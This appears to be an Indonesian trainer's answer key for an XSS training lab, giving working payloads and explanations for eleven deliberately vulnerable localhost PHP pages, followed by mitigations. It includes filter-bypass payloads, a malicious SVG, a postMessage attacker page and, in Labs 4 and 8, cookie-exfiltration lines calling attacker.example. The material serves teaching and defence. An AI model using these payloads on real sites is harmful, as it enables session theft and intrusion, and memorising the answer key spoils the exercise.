# Kunci Jawaban — XSS Lab

> 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
> penjelasan *kenapa* tiap payload berhasil untuk ke-11 lab di [README.md](README.md). Jangan
> dibagikan ke peserta sebelum sesi lab selesai.

---

## Lab 1 — Reflected XSS, HTML body (`lab1_reflected.php`)

**Sink:**
```php
Search results for: <?php echo $q; /* VULNERABLE: no htmlspecialchars() */ ?>
```
`$q` (parameter GET `q`) di-echo mentah ke dalam body HTML, tanpa encoding apa pun.

**Payload:**
```
http://localhost:8079/xss/lab1_reflected.php?q=<script>alert(document.domain)</script>
http://localhost:8079/xss/lab1_reflected.php?q=<img src=x onerror=alert(1)>
```
**Kenapa berhasil:** tidak ada `htmlspecialchars()`/encoding sama sekali, jadi tag yang
disisipkan langsung diparse browser sebagai elemen HTML aktif. Payload pertama jalan langsung
saat halaman dimuat; payload kedua memicu `onerror` karena `src=x` gagal dimuat sebagai gambar.

**Hasil:** popup `alert()` muncul menampilkan `document.domain`.

---

## Lab 2 — Reflected XSS, atribut HTML (`lab2_reflected_attribute.php`)

**Sink:**
```php
<input type="text" name="color" value="<?php echo $color; ?>">
```
`$color` disisipkan ke dalam atribut `value="..."` tanpa encoding.

**Payload 1 — keluar dari atribut lalu buka tag baru:**
```
?color="><script>alert(1)</script>
```
Hasil HTML yang terbentuk:
```html
<input type="text" name="color" value=""><script>alert(1)</script>">
```
`"` menutup atribut `value`, `>` menutup tag `<input>` lebih awal, lalu `<script>` baru
langsung tereksekusi.

**Payload 2 — tanpa tag baru, pakai event handler di atribut yang sama:**
```
?color=" onmouseover="alert(1)
```
Hasil: `<input type="text" name="color" value="" onmouseover="alert(1)">`. Submit form lalu
arahkan kursor ke kotak input untuk memicu `onmouseover`. Berguna untuk mendemonstrasikan
bypass filter yang hanya memblokir karakter `<`/`>`.

---

## Lab 3 — Reflected XSS, konteks JavaScript (`lab3_reflected_js.php`)

**Filter (tidak lengkap):**
```php
$name_js = str_replace('"', '\\"', $name);   // hanya escape karakter " saja
```

**Sink:**
```html
<script>
  var userName = "<?php echo $name_js; ?>";
</script>
```

**Payload 1 — keluar lewat parser HTML, bukan lewat JS (filter jadi tidak relevan):**
```
?name=</script><script>alert(1)</script>
```
**Kenapa berhasil:** browser mem-parsing tag `<script>...</script>` di level HTML *sebelum*
menjalankan isinya sebagai JS. Begitu parser HTML menemukan literal `</script>`, tag script
yang sedang berjalan langsung ditutup — filter `str_replace('"', ...)` tidak pernah menyentuh
string ini karena tidak mengandung karakter `"`.

**Payload 2 — "escape the escaper" pakai backslash:**
```
?name=\";alert(1);//
```
Jalannya: input mentah adalah `\";alert(1);//`. Filter mengganti setiap `"` menjadi `\"`,
sehingga `\"` (yang tadinya cuma 1 backslash + 1 quote) menjadi `\\"` (2 backslash + 1 quote).
Hasil akhir yang disisipkan ke `<script>`:
```html
<script>
  var userName = "\\";alert(1);//";
</script>
```
Secara sintaks JS, `"\\"` adalah string berisi satu karakter backslash literal yang **ditutup**
oleh `"` tersebut — statement `var userName = ...;` selesai di situ. `alert(1);` lalu
dieksekusi sebagai statement baru, dan `//` mengomentari sisa baris (`";`). Filter yang cuma
meng-escape `"` tanpa meng-escape `\` sendiri justru **membantu** attacker menetralkan quote
penutup miliknya.

---

## Lab 4 — Stored XSS, guestbook (`lab4_stored_comments.php`)

Komentar disimpan mentah (tanpa sanitasi) ke `data/comments.json`, lalu di-echo mentah lagi
saat ditampilkan — **dua** field rentan: `name` dan `comment`, keduanya tanpa
`htmlspecialchars()`.

**Payload (isi field "Comment" di form):**
```
<script>alert(document.cookie)</script>
```
atau untuk simulasi eksfiltrasi data nyata:
```
<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">
```
**Langkah:**
1. Isi nama bebas, isi komentar dengan salah satu payload di atas, submit.
2. Reload halaman (atau minta peserta lain membuka `lab4_stored_comments.php`) — payload
   tersimpan di `comments.json` dan dieksekusi ulang **untuk setiap pengunjung**, bukan cuma
   yang mengirim komentar. Ini yang membedakan stored dari reflected XSS.

**Poin diskusi:** bayangkan ini adalah dashboard admin yang membaca tiket/komentar dari user —
XSS tersimpan di sana bisa membajak sesi admin begitu tiket dibuka.

---

## Lab 5 — DOM-based XSS (`lab5_dom_xss.php`)

**Source & sink (murni client-side, JS berikut):**
```js
var hash = decodeURIComponent(location.hash.substring(1));
document.getElementById('output').innerHTML = 'You searched for: ' + hash;
```
`location.hash` (fragment URL setelah `#`) dibaca lalu ditulis langsung ke `innerHTML` tanpa
encoding — dipanggil ulang tiap event `hashchange` maupun saat page load.

**Payload:**
```
http://localhost:8079/xss/lab5_dom_xss.php#<img src=x onerror=alert(document.domain)>
```
**Poin diskusi penting:** fragment (`#...`) **tidak pernah dikirim ke server** — tidak akan
muncul di access log, WAF, atau proxy manapun yang memantau request. Ini kenapa DOM-based XSS
butuh analisis *source-to-sink* langsung pada kode JavaScript sisi klien, bukan cuma
memeriksa log/response server seperti pendekatan reflected/stored.

---

## Lab 6 — XSS + filter bypass (`lab6_filter_bypass.php`)

**Filter:**
```php
$filtered = str_replace('<script>', '', $input);   // case-sensitive, sekali pass, hanya 1 tag
```
Filter ini hanya menghapus substring persis `<script>` (huruf kecil semua), sekali jalan, dan
tidak menyentuh tag lain maupun atribut event handler.

**Empat bypass yang terbukti jalan terhadap filter ini:**

| Payload | Kenapa lolos |
|---|---|
| `<ScRiPt>alert(1)</ScRiPt>` | Filter *case-sensitive* — hanya mencocokkan `<script>` huruf kecil persis; browser tetap parse tag apa pun variasi huruf besar/kecilnya. |
| `<img src=x onerror=alert(1)>` | Tidak mengandung substring `<script>` sama sekali — filter tidak relevan. |
| `<svg onload=alert(1)>` | Sama seperti di atas — tag & event handler berbeda, tidak tersentuh filter. |
| `<scr<script>ipt>alert(1)</scr<script>ipt>` | Filter hanya jalan **1 kali** (bukan rekursif). Menghapus `<script>` yang ada **di tengah** justru menyatukan sisa fragmen `<scr` + `ipt>` menjadi `<script>` utuh kembali. Pola sama berlaku untuk tag penutup `</scr<script>ipt>` → `</script>`. |

**Hasil:** setelah difilter, payload ke-4 berubah menjadi `<script>alert(1)</script>` utuh dan
tereksekusi — contoh klasik kenapa blacklist string tunggal (non-rekursif) selalu bisa dilewati.

---

## Lab 7 — Reflected XSS lewat header (`lab7_useragent.php`)

**Sink:**
```php
User-Agent: <?php echo $ua; /* VULNERABLE: header reflected without htmlspecialchars() */ ?>
```
`$_SERVER['HTTP_USER_AGENT']` di-echo mentah — header ini tidak bisa diubah lewat navigasi
browser biasa, jadi butuh tool tambahan.

**Payload:**
```bash
curl -A "<script>alert(document.domain)</script>" http://localhost:8079/xss/lab7_useragent.php
```
Alternatif: ubah User-Agent lewat DevTools (Network conditions/Sensors) di browser lalu reload
halaman biasa.

**Poin diskusi:** reflected XSS tidak terbatas pada parameter URL — header HTTP apa pun yang
dikontrol attacker (User-Agent, Referer, X-Forwarded-For, dst.) dan di-echo tanpa encoding
adalah vektor yang sama validnya, misalnya kalau header tersebut pernah ditampilkan lagi di
halaman log/analytics admin.

---

## Lab 8 — XSS via `javascript:` URI (`lab8_javascript_uri.php`)

**Kode:**
```php
<a href="<?php echo htmlspecialchars($website, ENT_QUOTES); ?>">Kunjungi website saya</a>
```
`$website` (field "Website" pada form edit profil, disimpan di `$_SESSION`) memang di-escape
dengan benar pakai `htmlspecialchars($website, ENT_QUOTES)` — jadi ini **bukan** bug
missing-encoding seperti Lab 2. Tidak ada validasi bahwa nilainya harus diawali
`http://`/`https://` (allowlist skema).

**Payload:**
```
javascript:alert(document.domain)
javascript:fetch('https://attacker.example/steal?c='+document.cookie)
```

**Kenapa berhasil:** string `javascript:alert(document.domain)` adalah nilai atribut HTML yang
100% valid — tidak mengandung karakter `"`, `<`, `>`, atau apa pun yang perlu di-escape, jadi
`htmlspecialchars()` tidak mengubahnya sama sekali dan tidak melihat ada yang salah. Tapi
browser mendukung skema URI `javascript:` di mana pun URL biasa diterima, termasuk `href`.
Begitu link diklik, browser menjalankan isi setelah `javascript:` sebagai kode JS dengan origin
halaman ini — bukan menavigasi ke halaman baru. Ini adalah kelas bug yang benar-benar berbeda
dari HTML-injection: kegagalannya ada di **validasi skema/allowlist**, bukan di encoding.

**Langkah:**
1. Isi field "Website" dengan salah satu payload di atas, submit form ("Simpan Profil").
2. Profil tersimpan (session), muncul bagian "Preview profil Anda" dengan link "Kunjungi
   website saya".
3. Klik link tersebut → `alert()` (atau `fetch()` pencurian cookie) tereksekusi.

**Hasil:** popup `alert()` muncul, atau — untuk payload kedua — cookie sesi korban terkirim ke
server attacker begitu link diklik.

---

## Lab 9 — Stored XSS via upload avatar SVG (`lab9_svg_upload.php`)

**Kode:**
```php
// VULNERABLE: tidak ada validasi content-type / magic byte sama sekali
$name = time() . '_' . basename($_FILES['avatar']['name']);
move_uploaded_file($_FILES['avatar']['tmp_name'], $uploadDir . '/' . $name);
```
```html
<a href="data/uploads/<?php echo rawurlencode($uploaded_name); ?>" target="_blank">Lihat avatar saya (ukuran penuh)</a>
```
Atribut `accept="image/*"` pada `<input type="file">` hanyalah hint UI di browser (memfilter
dialog pemilihan file) — tidak pernah dicek ulang di server. File apa pun (termasuk `.svg`)
diterima dan disimpan apa adanya.

**Payload — simpan sebagai `pwned.svg`:**
```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">pwned</text></svg>
```

**Kenapa berhasil:** SVG adalah format berbasis XML, dan spesifikasinya mengizinkan tag
`<script>` maupun atribut event handler seperti `onload` di dalam dokumen SVG. Ketika file SVG
dibuka **langsung** lewat navigasi URL (`target="_blank"` ke `data/uploads/....svg`), browser
merender dokumen itu sebagai dokumen aktif (bukan sekadar gambar statis) dan mengeksekusi
`onload`-nya dengan origin situs yang meng-hosting file tersebut — beda dengan menaruh SVG di
dalam tag `<img src="....svg">`, yang di kebanyakan browser modern mem-sandbox/menonaktifkan
script di dalamnya.

**Langkah:**
1. Simpan payload di atas sebagai file `pwned.svg` di komputer.
2. Upload lewat form "Avatar" di `lab9_svg_upload.php`.
3. Klik link "Lihat avatar saya (ukuran penuh)" yang muncul setelah upload berhasil — ini
   membuka file SVG-nya langsung di tab baru.

**Hasil:** popup `alert(document.domain)` muncul di tab baru saat SVG selesai dimuat, karena
browser mengeksekusi atribut `onload` pada elemen `<svg>` root.

**Catatan cakupan:** lab ini fokus murni pada "SVG sebagai vektor XSS" (stored XSS lewat isi
file), berbeda dari kategori File Upload di lab terpisah yang fokus ke bypass filter ekstensi
untuk mencapai eksekusi PHP/RCE di server — di sini tidak ada kode PHP yang dieksekusi sama
sekali, murni browser-side.

---

## Lab 10 — DOM-based XSS via postMessage (`lab10_postmessage_xss.php`)

**Source & sink (murni client-side):**
```js
// VULNERABLE: tidak ada pengecekan event.origin, event.data ditulis langsung ke innerHTML
window.addEventListener('message', function(event) {
  document.getElementById('notify-area').innerHTML = event.data;
});
```

**Halaman attacker PoC (`lab10_attacker_iframe.php`):**
```js
var iframe = document.getElementById('target'); // src="lab10_postmessage_xss.php"
iframe.addEventListener('load', function() {
  iframe.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
});
```

**Payload (dikirim lewat `postMessage`):**
```html
<img src=x onerror=alert(document.domain)>
```

**Kenapa berhasil:** `postMessage` adalah API resmi untuk komunikasi lintas-origin antar
window/iframe. Penerima **wajib** memvalidasi `event.origin` terhadap allowlist domain
tepercaya sebelum memproses `event.data` sama sekali — halaman ini tidak melakukan validasi
apa pun, jadi domain mana pun (termasuk domain attacker) bisa mengirim pesan yang akan diterima
dan diproses. Ditambah lagi, `event.data` ditulis langsung ke `innerHTML`, jadi begitu payload
diterima, tag `<img>` di-parse sebagai HTML aktif dan `onerror` dipicu karena `src=x` gagal
dimuat sebagai gambar.

**Langkah:**
1. Buka `lab10_attacker_iframe.php` langsung di browser (bukan dari nav, halaman ini memang
   tidak dipasang di menu karena "bukan milik" aplikasi — mensimulasikan situs attacker
   eksternal).
2. Halaman itu meng-embed `lab10_postmessage_xss.php` di iframe dan otomatis mengirim payload
   lewat `postMessage()` begitu iframe selesai dimuat.
3. Amati iframe di halaman attacker — `alert()` muncul di dalamnya.

**Hasil:** popup `alert(document.domain)` muncul di dalam iframe (menampilkan domain halaman
korban `lab10_postmessage_xss.php`), membuktikan payload lintas-origin diterima dan dieksekusi
tanpa validasi origin.

**Poin diskusi:** bahkan jika origin *sudah* divalidasi, `innerHTML` tetap sink berbahaya —
mitigasi lengkap butuh **dua** lapis: allowlist `event.origin` DAN `textContent`/sanitizer
untuk `event.data`, bukan salah satu saja.

---

## Lab 11 — Reflected XSS meski ada CSP / unsafe-inline (`lab11_csp_bypass.php`)

**Header yang dikirim:**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';");
```

**Sink (identik dengan Lab 1):**
```php
Search results for: <?php echo $q; /* VULNERABLE: no htmlspecialchars() */ ?>
```

**Cara verifikasi header (sebelum submit payload):**
```bash
curl -i "http://localhost:8079/xss/lab11_csp_bypass.php?q=test"
```
Response menunjukkan `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';`.

**Payload:**
```
?q=<script>alert(document.domain)</script>
```

**Kenapa berhasil:** CSP *ada* dan terkirim di header — sekilas terlihat seperti mitigasi XSS
sudah terpasang. Tapi direktif `script-src` mengandung `'unsafe-inline'`, yang secara eksplisit
mengizinkan `<script>` inline (dan atribut event handler inline seperti `onerror=...`) untuk
tetap dieksekusi. `'unsafe-inline'` menghilangkan **persis** perlindungan utama yang biasanya
diberikan CSP terhadap reflected/stored XSS berbasis inline script — jadi payload yang sama
persis dengan Lab 1 tetap tereksekusi, CSP tidak menghalanginya sama sekali.

**Langkah:**
1. Jalankan `curl -i ...` di atas (atau cek tab Network → Response Headers di DevTools) untuk
   melihat sendiri header CSP dan menemukan `'unsafe-inline'`.
2. Submit payload `?q=<script>alert(document.domain)</script>` lewat form atau langsung di URL.
3. Hubungkan dua temuan: CSP "ada", tapi konfigurasinya (`'unsafe-inline'`) membuatnya tidak
   berfungsi untuk mencegah inline XSS.

**Hasil:** popup `alert(document.domain)` tetap muncul walau `Content-Security-Policy` header
terpasang di response.

**Poin diskusi — CSP yang benar-benar keras (untuk dibandingkan):**
```
Content-Security-Policy: script-src 'self' 'nonce-RANDOM123'; object-src 'none'; base-uri 'self';
```
- `'nonce-...'` (nilai acak per-response, bukan `'unsafe-inline'`) — hanya `<script>` yang
  membawa atribut `nonce` yang cocok yang diizinkan jalan; attacker yang tidak tahu nonce tidak
  bisa menyuntikkan script yang dieksekusi.
- `object-src 'none'` — blok vektor injeksi lewat `<object>`/`<embed>`/plugin.
- `base-uri 'self'` — cegah attacker memanipulasi tag `<base>` untuk membajak resolusi URL
  relatif di halaman (termasuk src script relatif).

CSP hanya jadi lapisan defense-in-depth yang berarti kalau dikonfigurasi ketat (nonce/hash,
tanpa `'unsafe-inline'`) — sekadar "header-nya ada" tidak sama dengan "terlindungi".

---

## Ringkasan hasil akhir

| Lab | Konteks | Payload final |
|---|---|---|
| 1 | HTML body | `<script>alert(document.domain)</script>` |
| 2 | Atribut HTML | `"><script>alert(1)</script>` |
| 3 | String JS | `</script><script>alert(1)</script>` **atau** `\";alert(1);//` |
| 4 | Stored (guestbook) | `<script>alert(document.cookie)</script>` di field comment |
| 5 | DOM (`innerHTML`) | `#<img src=x onerror=alert(document.domain)>` |
| 6 | Filter bypass | `<svg onload=alert(1)>` (atau 3 varian lain di tabel atas) |
| 7 | Header `User-Agent` | `curl -A "<script>alert(document.domain)</script>" ...` |
| 8 | Atribut `href` (`javascript:`) | `javascript:alert(document.domain)` di field Website |
| 9 | Stored (upload SVG) | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">pwned</text></svg>` sebagai `pwned.svg` |
| 10 | DOM (`postMessage` &rarr; `innerHTML`) | `<img src=x onerror=alert(document.domain)>` via `lab10_attacker_iframe.php` |
| 11 | HTML body, CSP `unsafe-inline` | `<script>alert(document.domain)</script>` (sama seperti Lab 1) |

## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
- Contextual output encoding: `htmlspecialchars()` untuk HTML body & atribut, `json_encode()`
  untuk menyisipkan data ke JavaScript (bukan concatenation manual seperti Lab 3).
- Content-Security-Policy untuk membatasi eksekusi inline script — dan pastikan **tidak**
  memakai `'unsafe-inline'` di `script-src` (Lab 11), karena itu meniadakan proteksi utamanya.
- `HttpOnly` cookie flag agar `document.cookie` tidak terbaca lewat XSS (Lab 4).
- Untuk DOM-based (Lab 5, Lab 10): audit sink berbahaya (`innerHTML`, `document.write`,
  `eval`), pakai `textContent` atau sanitizer seperti DOMPurify. Untuk `postMessage` (Lab 10),
  validasi `event.origin` terhadap allowlist SEBELUM memproses `event.data` sama sekali.
- Filter blacklist (Lab 6) selalu bisa dilewati — pakai encoding kontekstual atau allowlist.
- Allowlist skema URL (`http:`/`https:`/`mailto:`) sebelum menyisipkan URL user-controlled ke
  `href`/`src` — `htmlspecialchars()` saja tidak menangkap skema `javascript:` (Lab 8).
- Validasi upload file di server (content-type & magic byte, bukan cuma `accept="..."` di
  client), dan sajikan file yang diupload dari domain/subdomain terpisah tanpa cookie sesi
  aplikasi utama untuk mencegah stored XSS lewat SVG/HTML yang diupload (Lab 9).
